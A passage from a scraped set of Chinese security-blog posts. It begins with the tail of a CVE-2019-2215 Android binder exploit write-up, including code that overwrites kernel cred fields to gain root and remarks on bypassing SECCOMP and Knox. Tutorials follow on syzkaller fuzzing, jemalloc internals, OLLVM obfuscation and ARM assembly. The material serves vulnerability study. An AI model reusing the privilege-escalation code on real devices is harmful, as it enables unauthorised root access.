GLOBAL_ROOT_UID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, fsgid)), GLOBAL_ROOT_GID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, securebits)), SECUREBITS_DEFAULT); kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_inheritable)), CAP_EMPTY_SET); kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_permitted)), CAP_FULL_SET); kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_effective)), CAP_FULL_SET); kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_bset)), CAP_FULL_SET); kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_ambient)), CAP_EMPTY_SET); 前面已经泄露出了task_struct-\u0026gt;cred的地址，这里就只用将事先准备好的cred结构体写入即可\n最后执行system(\u0026quot;/bin/sh\u0026quot;);、execve(\u0026quot;/system/bin/sh\u0026quot;);即可获得root权限。\nDisabling SECCOMP 额外的如果想要将提权程序捆绑到app上的还需要这一步，Android8开始，所有 Android 软件都使用系统调用与 Linux 内核进行通信，SECCOMP过滤器会检测所有的非法调用。SECCOMP过滤器是放在zygote 进程中，而所有的Android应用程序都是该进程fork出来的，按理所以会影响到所有的应用，但是Android安全团队进行了部分筛选，只会阻止某些系统调用。\n1 2 3 4 struct seccomp { int mode; struct seccomp_filter *filter; }; 想要禁用SECCOMP，直接将mode改为0是导致内核崩溃，需要清除TIF_SECCOMP 标志。这篇文章实现了绕过，感兴趣可以看一看。\n对于三星的设备，还需要绕过Knox/RKP才行。对于如何绕过，最近有人公开了s8相关的利用代码，感兴趣可以看看。\npatch patch\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 diff --git a/drivers/android/binder.c b/drivers/android/binder.c index a340766b51fe..2ef8bd29e188 100644 --- a/drivers/android/binder.c +++ b/drivers/android/binder.c @@ -4302,6 +4302,18 @@ static int binder_thread_release(struct binder_proc *proc, if (t) spin_lock(\u0026amp;t-\u0026gt;lock); } + +\t/* +\t* If this thread used poll, make sure we remove the waitqueue +\t* from any epoll data structures holding it with POLLFREE. +\t* waitqueue_active() is safe to use here because we\u0026#39;re holding +\t* the inner lock. +\t*/ +\tif ((thread-\u0026gt;looper \u0026amp; BINDER_LOOPER_STATE_POLL) \u0026amp;\u0026amp; +\twaitqueue_active(\u0026amp;thread-\u0026gt;wait)) { +\twake_up_poll(\u0026amp;thread-\u0026gt;wait, POLLHUP | POLLFREE); +\t} + binder_inner_proc_unlock(thread-\u0026gt;proc); if (send_reply) 在binder_thread free之前清理掉thread-\u0026gt;wait即可。\n总结 去年出的经典的提权漏洞，这个漏洞当做提权入门也还不错，可以学习到一个完整的提权流程和几个常见方法。\n后续真机测试过程中手上没pixel2 只能在pixel的3.18上测试，得注意先测试再使用网上的exp。然后就是适配的话主要是对于一些偏移的适配，以及不是所有的设备能都直接利用，不同内核版本和不同产商又不一样。\n提权过程中最主要注意的就是不让内核发生奇奇怪怪的奔溃，每次遇到奔溃，可能就需要想其他的方法去绕过。\n关于这个漏洞还有很多其他思路可以尝试，比如人造页表镜像攻击之类的方式。\n参考 https://www.52pojie.cn/thread-1083552-1-1.html\nhttps://blog.csdn.net/weixin_43901866/article/details/102458212\nhttps://cloudfuzz.github.io/android-kernel-exploitation/\nhttps://github.com/sharif-dev/AndroidKernelVulnerability\nhttps://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/\nhttps://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/\n","date":"2020-06-30T00:00:00+08:00","permalink":"https://ykiko.top/p/cve-2019-2215%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/","title":"CVE-2019-2215分析利用记录"},{"content":"syzkaller_fuzzing_入门 0x00 介绍 syzkaller是google的安全研究人员开发并维护的内核fuzz工具。它主要是用go写的，也有少部分C代码，支持akaros/fuchsia/linux/android/freebsd/netbsd/openbsd/windows等系统，发现的漏洞多达上千。\n0x01 环境配置 环境要求：\nC/C++ 编译器\nGCC 6.1.0+ linux kernel\n编译 v4.6以后编译时确保CONFIG_KCOV=y 之前版本：这样添加支持\n一些额外选项\nVM 一般QEMU\n支持QEMU、kvmtool和GCE虚拟机、Android设备和Odroid C2开发板\n需要进行通信：vm要提供网络支持\nvm配置需要ssh服务器\n要能执行ssh -i $SSHID -p $PORT root@localhost\n需要将debugfs 挂在到 /sys/kernel/debug\nGolang 安装\n1 2 3 4 5 6 7 8 9 10 wget https://dl.google.com/go/go1.14.1.linux-amd64.tar.gz tar -C ~/goroot -xzf go1.14.1.linux-amd64.tar.gz vim /etc/profile mkdir /usr/local/gopath # 添加export export GOROOT=/home/kuekiko/goroot export GOPATH=/home/kuekiko/gopath export PATH=$GOROOT/bin:$PATH export PATH=$GOPATH/bin:$PATH source etc/profile syzkaller\n1 2 3 4 5 # build go get -u -d github.com/google/syzkaller/... cd $GOROOT/src/github.com/google/syzkaller/ make -j4 # build之后在bin/下 如果要cross-OS/arch 进行测试的话，记得修改TARGETOS, TARGETVMARCH 和TARGETARCH参数再make 0x02 Init syzkaller 生成镜像\n1 2 3 4 5 6 7 8 9 sudo apt install debootstrap cd gopath/src/github.com/google/syzkaller/tools/ # 使用国内源 修改create-image.sh sudo debootstrap --include=$PREINSTALL_PKGS --components=main,contrib,non-free $RELEASE $DIR # 改成 sudo debootstrap --include=$PREINSTALL_PKGS --components=main,contrib,non-free $RELEASE $DIR http://mirrors.163.com/debian/ ./create-image.sh # 选项 --distribution wheezy --feature full # 生成了stretch.id_rsa stretch.id_rsa.pub stretch.img 编译启动 内核 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 export KERNEL=/home/kuekiko/linux_kernel export IMG=/home/kuekiko/linux_kernel/img export PATH=$KERNEL:$PATH export PATH=$IMG:$PATH # 默认编译 cd $KERNEL/xxx make CC=\u0026#34;$GCC/bin/gcc\u0026#34; defconfig make CC=\u0026#34;$GCC/bin/gcc\u0026#34; kvmconfig # 直接 make menuconfig # 编辑.config CONFIG_KCOV=y CONFIG_DEBUG_INFO=y CONFIG_KASAN=y CONFIG_KASAN_INLINE=y # 新 CONFIG_CONFIGFS_FS=y CONFIG_SECURITYFS=y make CC=\u0026#34;$GCC/bin/gcc\u0026#34; olddefconfig make CC=\u0026#34;$GCC/bin/gcc\u0026#34; -j4 qemu 1 2 3 4 5 6 7 8 9 10 11 qemu-system-x86_64 \\ -kernel $KERNEL/arch/x86/boot/bzImage \\ -append \u0026#34;console=ttyS0 root=/dev/sda earlyprintk=serial\u0026#34;\\ -hda $IMAGE/stretch.img \\ -net user,hostfwd=tcp::10021-:22 -net nic \\ -enable-kvm \\ -nographic \\ -m 2G \\ -smp 2 \\ -pidfile vm.pid \\ 2\u0026gt;\u0026amp;1 | tee vm.log ssh连接\nssh -i $IMG/stretch.id_rsa -p 10021 -o \u0026quot;StrictHostKeyChecking no\u0026quot; root@localhost\nkill qemu 使用kill $(cat vm.pid)\n0x03 Start Fuzzing 添加配置文件my.cfg\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 { \u0026#34;target\u0026#34;: \u0026#34;linux/amd64\u0026#34;, \u0026#34;http\u0026#34;: \u0026#34;127.0.0.1:56741\u0026#34;, \u0026#34;workdir\u0026#34;: \u0026#34;$GOPATH/src/github.com/google/syzkaller/workdir\u0026#34;, \u0026#34;kernel_obj\u0026#34;: \u0026#34;$KERNEL\u0026#34;, \u0026#34;image\u0026#34;: \u0026#34;$IMAGE/stretch.img\u0026#34;, \u0026#34;sshkey\u0026#34;: \u0026#34;$IMAGE/stretch.id_rsa\u0026#34;, \u0026#34;syzkaller\u0026#34;: \u0026#34;$GOPATH/src/github.com/google/syzkaller\u0026#34;, \u0026#34;procs\u0026#34;: 4, \u0026#34;type\u0026#34;: \u0026#34;qemu\u0026#34;, \u0026#34;vm\u0026#34;: { \u0026#34;count\u0026#34;: 4, \u0026#34;kernel\u0026#34;: \u0026#34;$KERNEL/arch/x86/boot/bzImage\u0026#34;, \u0026#34;cpu\u0026#34;: 2, \u0026#34;mem\u0026#34;: 2048 } } 启动fuzzing\n./bin/syz-manager -config=my.cfg\n浏览器打开http://127.0.0.1:56741/\n虚拟机性能太垃圾，太慢了 fuzzing半天没也啥crashes。还是得用服务器。\n挂机了大概3小时，出了几个没啥用的crach。\n0x04 总结 还有很多选项可以开启，没试。\n看看实现源码，还有就是之后试试Fuzzing Android\n参考 https://github.com/google/syzkaller\nhttps://www.freebuf.com/sectool/142969.html\nhttp://blog.douluodalu.wang/2020/03/22/syz-fuzz%E5%88%9D%E6%8E%A2/\nhttps://github.com/google/syzkaller/blob/master/docs/linux/setup.md\n","date":"2020-04-10T00:00:00+08:00","permalink":"https://ykiko.top/p/syzkaller_fuzzing_%E5%85%A5%E9%97%A8/","title":"syzkaller_fuzzing_入门"},{"content":"Android之jemalloc 0x00 简单介绍 想调一个CVE、发现对jemalloc 了解太少。重新复习复习jemalloc，做个记录。\njemalloc最初是2005年 Jason Evans开发的新一代内存分配器， 之后没多久被添加到FreeBSD的libc中的默认内存分配器，用来替代原来的phkmalloc。2007年 Firefox Mozilla项目的独立版本也将jemalloc作为主要的分配器。2009年，Facebook 的后端项目也广泛使用jemalloc。2014年，Android 5 开始采用jemalloc作为主要的内存分配器，不过部分Android5/6依然能看到dlmalloc和jemalloc两者并存。\njemalloc的一些特性与设计原则：\n强大的多核/多线程分配能力.\n最小化的元数据开销\n基于每个线程进行缓存，避免了同步问题。\n避免了连续分配内存的碎片化问题。\n简洁高效\n0x01 结构 结构图\njemalloc对内存划分按照如下由高到低的顺序:\n内存是由一定数量的arenas进行管理.一个arena被分割成若干chunks, 后者主要负责记录bookkeeping（记录信息）.chunk内部又包含着若干runs, 作为分配小块内存的基本单元.run由pages组成, 最终被划分成一定数量的regions对于small size的分配请求来说, 这些region就相当于user memory.\narenas 对于Android来说：\n限制了只使用两个arenas,每个带有一个lock。这意味着，不同线程尝试分配内存时，会循环、平均分配至两个arena，确保两个arena有大致相等的进程数量。只有在相同的arena中分配内存时才需要获取lock。\n1 2 3 4 5 6 7 8 9 10 11 12 13 #/android.bp android_product_variables = { // Only enable the tcache on non-svelte configurations, to save PSS. malloc_not_svelte: { cflags: [ \u0026#34;-UANDROID_MAX_ARENAS\u0026#34;, \u0026#34;-DANDROID_MAX_ARENAS=2\u0026#34;, \u0026#34;-DJEMALLOC_TCACHE\u0026#34;, \u0026#34;-DANDROID_TCACHE_NSLOTS_SMALL_MAX=8\u0026#34;, \u0026#34;-DANDROID_TCACHE_NSLOTS_LARGE=16\u0026#34;, ], }, } 用shadow查看arenas\nchunk 一个arena下会有若干个chunk，Android 7之前chunk为256k，之后32位系统改为512k，64位系统改为2MB。\n每个chunk都有一个chunk head 包含着这个chunk的元数据（metadata）.Android 7之后元数据增加了mapbias与mapbits flags。\nchunk是存放run的容器，大小固定相同，操作系统返回的内存被划分到chunk中管理\nchunk中的元数据结构，mapbit[0]与mapmisc[0]指向chunk中的第一个run：\nchunk元数据中mapmisc中的bitmap结构管理着run中的region的分配使用：\nchunk\nrun run是存放连续的大小相同的region的容器，每个chunk中会包含若干个run，而run的metadata会存放在chunk的header当中，这样region里只存放数据本身，不再有内存属性说明。\nregion region是最小的存储单元，每个run里面的region大小完全相同，也没有元数据，malloc实际返回的是region的地址。\nbins jemalloc也用bin来管理内存，共有39个bins。bin的metadata存放于arena的header中，39个bin还会存放当前正在使用的run。所有带有空闲region的run和闲置的chunk信息会被放置在红黑树结构当中，这样寻找空闲内存的复杂度可以控制在o(log(n))。\ntcache 为了优化多线程性能，jemalloc还采用了LIFO结构的tcache，存放近期被释放的region，每个线程的每个bin都对应一个tcache，存放在tcache中的内存并不会设置free标记位，并且由于tache附着于线程本身，使得大部分情况下从tcache分配内存时完全无需lock。\n当jemalloc新分配一块内存是发现tcache为空，会触发prefill事件，此时jemalloc会将单前的arena上lock,并从当前run中取出一定数量的region存入tcache，保证tcache不为空。\n当tcache满了（small bin是8，larger bin是20）的时候，会触发flush 事件，会释放部分region，并且才会被标记为已释放。这时这些region才能被其他线程自由分配。\n此外，jemalloc也实现是GC机制。会有一个计数器统计申请和释放，达到阈值之后会触发特别的事件，目标bin里的tcache的四分之三的region会被释放掉。下次GC时会轮到下一个bin。这是可以从tcache中删除region并使其恢复常规可用性的另一种方法。\n分配流程 计算申请内存大小从当前线程的tcache中找到合适的bin如果tcache为空，就从当前的run中prefill一些region进来如果当前run耗尽，就从低地址开始找到第一个非空run如果现有run里没有足够的内存就分配一个新run如果chunk里没有空间了就分配一个新chunk，同时分配新run并prefill一些region到tcache\n0x02 shadow 使用shadow查看Android中的内存布局，简单学习下shadow的使用\n查看arenas 可以看到一共两个arenas，每个arena有36个bin，一共2个chunk。\n查看chunks 单个chunk，查看chunk中的run\n查看runs，会列出单前所有的run的详情 run_siez = region_size*no_regions\n只显示单前运行中的run\n是否是allocated状态是根据arena_chunk_map_bits_s 对应 bits的 第 [0] bit 来确定 这里jemalloc5 和 jemalloc4 3不一样。\n查看单个run的详情：\nrun的布局如下：\n源代码arena.h中有很多关于bits之类的注释。能够帮助理解。\n查看bins:\n1 2 3 4 5 6 struct arena_bin_s { malloc_mutex_t lock; arena_run_t *runcur; arena_run_heap_t runs; //4之前版本为arena_run_tree_t 类型 malloc_bin_stats_t stats; //统计信息 } runcur: 当前可用于分配的run, 一般情况下指向地址最低的non-full run, 同一时间一个bin只有一个current run用于分配.\n看别人的文章说是除去0号bin以外没4个bin为一组，组内size差一样，但是在这里可以看到每8个为一组，01-8号bin的size差值都为0x10,算是第一组，那第二组就为9-12号，只有4个bin size差值为0x20,但是有的为空，算第二组。没两组之间的差值2倍。以此类推，后面每4个为一组。\n划分为{0}、{1-8}、{9-12}、{13-16}····· 可能不同版本会有区别。\n查看regions [换了一个进程]\n大小都是0x8\n按大小查找：第4个：\ntchche查看：\ntcache的定义：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 struct tcache_bin_info_s { unsigned\tncached_max;\t/* Upper limit on ncached. */ }; struct tcache_bin_s { tcache_bin_stats_t tstats; int\tlow_water;\t/* Min # cached since last GC. */ unsigned\tlg_fill_div;\t/* Fill (ncached_max \u0026gt;\u0026gt; lg_fill_div). */ unsigned\tncached;\t/* # of cached objects. */ /* * To make use of adjacent cacheline prefetch, the items in the avail * stack goes to higher address for newer allocations. avail points * just above the available space, which means that * avail[-ncached, ... -1] are available items and the lowest item will * be allocated first. */ void\t**avail;\t/* Stack of available objects. */ }; struct tcache_s { ql_elm(tcache_t) link;\t/* Used for aggregating stats. */ uint64_t\tprof_accumbytes;/* Cleared after arena_prof_accum(). */ ticker_t\tgc_ticker;\t/* Drives incremental GC. */ szind_t\tnext_gc_bin;\t/* Next bin to GC. */ tcache_bin_t\ttbins[1];\t/* Dynamically sized. */ /* * The pointer stacks associated with tbins follow as a contiguous * array. During tcache initialization, the avail pointer in each * element of tbins is initialized to point to the proper offset within * this array. */ }; struct tcaches_s { union { tcache_t\t*tcache; tcaches_t\t*next; }; }; 0x03 利用 堆溢出\n一般先利用gadget 绕过ASLR，再利用gadget拿到代码执行的权限，只要能执行代码就能逃出sandboxing或者摆脱selinux。\nSmall region overflow Run overflow Chunk overflow 总结 后面还是得使用shadow工具具体调试CVE加深理解。\njemalloc新版与旧版有挺多区别，之后想要深入了解jemalloc的细节以及一些实现还是得看看源码。\n参考 https://github.com/jemalloc/jemalloc\nhttps://blog.csdn.net/txx_683/article/details/53468211\nhttps://blog.nsogroup.com/a-tale-of-two-mallocs-on-android-libc-allocators-part-2-jemalloc/\nhttps://www.anquanke.com/post/id/149132#h3-5\nhttps://www.anquanke.com/post/id/85982\ndlmalloc 的一个tools: shade\n","date":"2020-04-05T00:00:00+08:00","permalink":"https://ykiko.top/p/android%E4%B9%8Bjemalloc/","title":"Android之jemalloc"},{"content":"syzkaller-android 0x00 前言 介绍使用syzkaller fuzz Android的配置教程。\n0x01 环境 按要安装好环境\ngo\nsyzkaller\n交叉编译aarch64-linux-android、g++-aarch64-linux-gnu、gcc-arm-linux-gnueabihf、g++-arm-linux-gnueabihf\n0x02 配置 创建配置文件android.cfg\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 { \u0026#34;target\u0026#34;: \u0026#34;linux/arm64\u0026#34;, // arm \u0026#34;http\u0026#34;: \u0026#34;127.0.0.1:56741\u0026#34;, \u0026#34;workdir\u0026#34;: \u0026#34;$GOPATH/src/github.com/google/syzkaller/workdir\u0026#34;, \u0026#34;kernel_obj\u0026#34;: \u0026#34;$KERNEL\u0026#34;, // 内核路径 \u0026#34;syzkaller\u0026#34;: \u0026#34;$GOPATH/src/github.com/google/syzkaller\u0026#34;, \u0026#34;sandbox\u0026#34;: none, \u0026#34;procs\u0026#34;: 8, \u0026#34;type\u0026#34;: \u0026#34;adb\u0026#34;, \u0026#34;cover\u0026#34;: true, \u0026#34;vm\u0026#34;: { \u0026#34;devices\u0026#34;: [$DEVICES], \u0026#34;battery_check\u0026#34;: true } } KASAN+KCOV编译内核\n首先编译要fuzz的Android版本输入手机。（过程省略）[1]\n下载编译基准内核。[2] ，使用手动编译会报错，使用给KASCAN文档[3]的方法也可能报错。\n1 2 3 4 5 6 7 8 9 10 ## 创建文件夹 mkdir android-kernel \u0026amp;\u0026amp; cd android-kernel ## 切换分支 repo init -u https://android.googlesource.com/kernel/manifest -b BRANCH repo sync ## 修改内核build文件 内核路径下的build.config制定make_deconfig KERNEL_DIR=private/msm-google . ${ROOT_DIR}/${KERNEL_DIR}/build.config.common ##这里 ## 构建内核 build/build.sh 刷入内核\n重新编译aosp启动镜像\n在服务器上编译的将out/dist目录打包备份\n1 2 3 4 5 6 7 8 9 cd {aosp_dir} cp {kernel_dir}/out/{version}/dist/Image.lz4-dtb {aosp}/device/google/marlin-kernel . build/envsetup.sh lunch aosp_sailfish-userdebug make -j64 ## 重新拷贝到本地 win adb reboot bootloader set ANDROID_PRODUCT_OUT=./ fastboot flashall -w 之前 3.18.137-g72a7a6\n之后 … (手机显示无法显示内核) ```shell sailfish:/ # uname -a Linux localhost 3.18.137-g8b62de70252d #1 SMP PREEMPT 2019-09-27 02:13:04 aarch64 ``` 修改内核重新刷入\n失败的方法 按文档说的\n```shell cd arch/arm64/configs cp marlin_defconfig marlin-kasan_defconfig ``` 在配置文档中移除`CONFIG_KERNEL_LZ4=y` 加入 ```plain text CONFIG_KASAN_INLINE=y CONFIG_KCOV=y CONFIG_SLUB=y CONFIG_SLUB_DEBUG=y ``` 重新编译内核。 发现任何变化 尝试的方法\n修改build.config文件 ```shell . ${ROOT_DIR}/${KERNEL_DIR}/build.config.kasan (失败) ``` 不修改，还是去修改marlin_defconfig添加KASAN 报错：savedefconfig does not match private/msm-google 修改build.config 删掉check_defconfig 检查 （失败） 不修改文件\n使用命令 ```shell ./build/build.sh BUILD_CONFIG=build.config.kasan ``` 最后发现\n1 2 cp private/msm-google/build.config.kasan ./ BUILD_CONFIG=build.config.kasan build/build.sh ##放前面才管用 编译完成 ，修改aosp参数\n1 2 3 aosp$ cd device/google/marlin/sailfish cp BoardConfig.mk BoardConfig.mk.bak vim BoardConfig.mk 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ## 注释掉 BOARD_KERNEL_BASE := 0x80000000 BOARD_KERNEL_PAGESIZE := 4096 ## ifneq ($(filter sailfish_kasan, $(TARGET_PRODUCT)),) BOARD_KERNEL_OFFSET := 0x80000 BOARD_KERNEL_TAGS_OFFSET := 0x02500000 BOARD_RAMDISK_OFFSET := 0x02700000 BOARD_MKBOOTIMG_ARGS := --kernel_offset $(BOARD_KERNEL_OFFSET) --ramdisk_offset $(BOARD_RAMDISK_OFFSET) --tags_offset $(BOARD_KERNEL_TAGS_OFFSET) ## else ## BOARD_KERNEL_TAGS_OFFSET := 0x02000000 ## BOARD_RAMDISK_OFFSET := 0x02200000 ## endif TARGET_KERNEL_ARCH := arm64 TARGET_KERNEL_HEADER_ARCH := arm64 修改device/google/marlin/device-common.mk\n1 2 lz4-\u0026gt;gz LOCAL_KERNEL := device/google/marlin-kernel/Image.gz-dtb 新的问题\n1 error: out/target/product/sailfish/boot-debug.img too large 解决方法：将BoardConfig.mk的BOARD_BOOTIMAGE_PARTITION_SIZE的值改大。\n重新编译aosp启动镜像 再刷入手机。\n0x03 开启fuzzing 1 ./bin/syz-manager -config=android.cfg fuzz\n手机不断重启。。。。\n查看msg:adb shell dmesg -w\nsyz-manager -debug 查看syz的相关问题。\n参考 [1]https://source.android.google.cn/setup/build?hl=zh-cn\n[2]https://source.android.google.cn/setup/build/building-kernels?hl=zh-cn\n[3]https://source.android.com/devices/tech/debug/kasan-kcov\n[4]https://github.com/google/syzkaller/blob/master/docs/linux/setup_linux-host_android-device_arm-kernel.md\n","date":"2019-09-15T00:00:00+08:00","permalink":"https://ykiko.top/p/syzkaller-android/","title":"syzkaller-android"},{"content":"OLLVM_混淆之一（补 OLLVM OLLVM(Obfuscator-LLVM)是瑞士西北应用科技大学安全实验室于2010年6月份发起的一个针对LLVM代码混淆项目， 用于增加逆向难度，保护代码的安全。最新版本为4.0。OLLVM适用LLVM支持的所有语言（C, C++, Objective-C, Ada 和 Fortran）和目标平台（x86, x86-64, PowerPC, PowerPC-64, ARM, Thumb, SPARC, Alpha, CellSPU, MIPS, MSP430, SystemZ, 和 XCore）。\nLLVM是lowlevel virtual machine的简称，是一个编译器框架。详细介绍可以看WIKI-LLVM 经典的三段式设计，前端使用不同的编译工具对代码进行分析转换成LLVM的中间表示IR（intermediate representation）。中间部分优化器只对IR进行操作，通过一系列的Pass对IR做优化。后端主要是讲优化好的IR解释成对应的机器码。\n对IR的处理过程下图：\nIR Pass\nOLLVM的混淆操作在IR层，通过编写Pass来混淆IR，以致后端生成的目标代码也被混淆了。\nOLLVM-Android环境搭建 前提环境：\nNDK环境\nLLVM\n下载源码(包括了LLVM和Clang)-编译OLLVM步骤如下：\n1 2 3 4 5 6 $ git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git $ mkdir build $ cd build $ cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator/ //（cmake -G \u0026#34;MinGW Makefiles\u0026#34; -DCMAKE_BUILD_TYPE=Release ../obfuscator/）(windows) $ make -j7 //这个数字自己看自己CPU填 太小可能非常编译慢 可以参照官方wiki来操作。编译完成后，二进制文件放在build/bin目录下。\n配置整合NDK：\n打开NDK目录ndk-bundle下的toolchains，新建obfuscator-llvm-4，将llvm文件夹里的所有文件复制到新建的目录下。\n将\\build\\bin目录下的clang.exe、clang++.exe和clang-format.exe复制到\\toolchains\\llvm\\prebuilt\\windows-x86_64\\bin目录下，直接替换掉其中的文件。（Windows下）\n（linux下)将llvm目录下的prebuilt目录和文件 config.mk、setup.mk和setup-common.mk拷贝到创建的obfuscator-llvm目录下-\u0026gt;然后替换obfuscator-llvm/prebuilt/linux-x86下的bin和lib为我们编译好的bin和lib\n然后将下面文件复制一份，改名称如下，比如arm-linux-androideabi-clang3.4复制一行改名为arm-linux-androideabi-obfuscator3.4\narm-linux-androideabi-clang3.4-\u0026gt; arm-linux-androideabi-obfuscator3.4\nmipsel-linux-android-clang3.4-\u0026gt; mipsel-linux-android-obfuscator3.4\nx86-clang3.4-\u0026gt; x86-obfuscator3.4\n分别修改以上三个文件的 setup.mk 中的 LLVM_NAME ，即将其指定到开始建立的obfuscator-llvm-3.4目录，也就是把把LLVM_NAME := llvm-$(LLVM_VERSION)改成LLVM_NAME := obfuscator-llvm-$(LLVM_VERSION)\n如果是配置64位的ndk配置,还要额外修改$NDK_PATH/build/core/setup-toolchain.mk文件，在NDK_64BIT_TOOLCHAIN_LIST := 加入 obfuscator 对应的NDK_TOOLCHAIN_VERSION NDK_64BIT_TOOLCHAIN_LIST := obfuscator3.4 clang3.6 clang3.5 clang3.4 4.9’\n开始使用OLLVM 参考 http://www.freebuf.com/articles/terminal/130142.html\nhttps://geneblue.github.io/2016/10/09/%E5%88%A9%E7%94%A8OLLVM%E6%B7%B7%E6%B7%86Android%20Native%E4%BB%A3%E7%A0%81%E7%AF%87%E4%B8%80/\nhttps://www.jmpoep.com/thread-4016-1-1.html\nBCTFhttp://ele7enxxh.com/Bctf-2016-LostFlower-Writeup.html\n","date":"2019-09-10T00:00:00+08:00","permalink":"https://ykiko.top/p/ollvm_%E6%B7%B7%E6%B7%86%E4%B9%8B%E4%B8%80%E8%A1%A5/","title":"OLLVM_混淆之一（补"},{"content":"ARM汇编基础(待补充) ARM汇编基础(简) 经常忘记，做个笔记，好作复习。。\n内容主要来源于《Android软件安全与逆向分析》和《逆向工程权威指南》以及 ARM 汇编 和Azeria-labs\nARM架构 ARM属于RISC CPU，\nARM模式 4个字节opcode 32位\nThumb模式 2个字节opcode 16位\nThumb-2模式 同上（只是有部分4个字节的opcode)\n64位ARM 4个字节opcode\nARM机器码在版本3之前是小端。但是之后默认采用大端格式，但可以设置切换到小端。\n数据类型 数据类型在汇编语言中的扩展后缀为**-h或者-sh对应着半字，-b或者-sb**对应着字节，但是对于字并没有对应的扩展\n1 2 3 4 5 6 7 8 9 10 ldr = 加载字，宽度四字节 ldrh = 加载无符号的半字，宽度两字节 ldrsh = 加载有符号的半字，宽度两字节 ldrb = 加载无符号的字节 ldrsb = 加载有符号的字节 str = 存储字，宽度四字节 strh = 存储无符号的半字，宽度两字节 strsh = 存储有符号的半字，宽度两字节 strb = 存储无符号的字节 strsb = 存储有符号的字节 字节序 在内存中有两种字节排布顺序，大端序(BE)或者小端序(LE)。两者的主要不同是对象中的每个字节在内存中的存储顺序存在差异。一般X86中是小端序，最低的字节存储在最低的地址上。在大端机中最高的字节存储在最低的地址上。\n数据访问时采取大端序还是小端序使用程序状态寄存器(CPSR)的第9比特位来决定的。\n寄存器 37个32位寄存器，其中31个为基础寄存器，6个为状态寄存器。\n用户模式下有\n不分组寄存器（R0-R7） R7一般存放系统调用号\n分组寄存器（R8-R14）\n程序计数器（R15）\n单前程序状态寄存器（CPSR）\n两种状态：\nARM状态（32位对齐） Thumb状态(16位对齐) R0-R7 R0-R7(相同) CPSR CPSR（同） R11 FP（栈帧指针） R12 IP（内部程序调用） R13 SP（栈指针） R14 LR（链接寄存器）一般存放函数返回地址 R15 PC（程序计数器） 和x86对比：\nCSPR:\n32位的CPSR寄存器的比特位含义，左边是最大比特位，右边是最小比特位。每个单元代表一个比特。\n条件码 助记符后缀 标志 含义 0000 EQ Z置位 相等 0001 NE Z清零 不相等 0010 CS C置位 无符号数大于或等于 0011 CC C清零 无符号数小于 0100 MI N置位 负数 0101 PL N清零 正数或零 0110 VS V置位 溢出 0111 VC V清零 未溢出 1000 HI C置位Z清零 无符号数大于 1001 LS C清零Z置位 无符号数小于或等于 1010 GE N等于V 带符号数大于或等于 1011 LT N不等于V 带符号数小于 1100 GT Z清零且（N等于V） 带符号数大于 1101 LE Z置位或（N不等于V） 带符号数小于或等于 1110 AL 忽略 无条件执行 程序结构 Android平台采用的是GUN ARM汇编格式，汇编器为GAS\n参数传递：R0-R3这4个寄存器用来传递函数调用的第1到4个参数，超出的参数通过堆栈来传递。R0还用来存放函数调用的返回值。\n汇编器指令 .file:源文件名\n.align:代码对齐方式\n.ascii:声明字符串\n.global:声明全局符号\n.type：指定符号的类型\n.word：存放地址值\n.size：设置指定符号的大小\n.ident：编译器标识\n寻址方式 立即寻址\nMOV R0, #1234 -\u0026gt;R0=1234\n寄存器寻址\nMOV R1 = R2 -\u0026gt;R0=R1\n寄存器移位寻址\nLSL ：逻辑左移，移位后寄存器空出的低位补0\nLSR：逻辑右移，移位后寄存器空出的高位补0\nASR：算术右移，移位过程中符号位保持不变，若源操作数为正数，则移位后空出的高位补0，否则补1。\nROR：循环右移，移位后移出的低位填入移位空出的高位。\nRRX：带扩展的循环右移，操作数右移一位，移出的空位用C标志的值填充。\nMOV R0, R1, LSL #2 -\u0026gt;R1左移两位（R1\u0026laquo;2）赋值给R0,相当于R0 = R1*4\n寄存器间接寻址\nLDR RO, [R1] -\u0026gt;将R1寄存器的数值作为地址，取出此地址中的值赋给R0寄存器\n基址寻址\n多用于查表、数组访问操作。\nLDR R0, [R1,#-4] -\u0026gt;将R1寄存器的数值减4作为地址，取出此地址的值赋给R0寄存器。\n多寄存器寻址\n一条指令最多完成16个通用寄存器值的传送。\nLDMIA R0,{R1,R2,R3,R4} -\u0026gt;LDM为数据加载指令，指令的后缀IA表示每次执行完加载操作后R0寄存器的值自增1个字，ARM指令集中，子表示的是一个32位数值。这条指令作用为：R1 = [R0],R2 = [R0+#4],R3 = [R0+#8],R4 = [R0+#12]。\n堆栈寻址\n特定的指令来完成：LDMFA/STMFA、LDMEA/STMEA、LDMFD/STMFD、LDMED/STMED。\nLDM和STM为指令前缀，表示多寄存器寻址，即一次传送多个寄存器的值。后面的后缀为指令后缀。\nSTMFD SP!, {R1-R7,LR} -\u0026gt;将R1~R7,LR入栈，多用于保存子程序的现场。\nLDMFD SP!, {R1-R7,LR} -\u0026gt;出栈，恢复现场。\n块拷贝寻址\n实现从连续地址数据从存储器的某一位置拷贝到另外一个位置，指令有：LDMIA/STMIA、LDMDA/STMDA、LDMIB/STMIB、LDMDB/STMDB。\nLDMIA R0! {R0-R3} 从R0寄存器指向的存储单元中读取3个字到R1-R3寄存器\nSTMIA R0! {R0-R3} 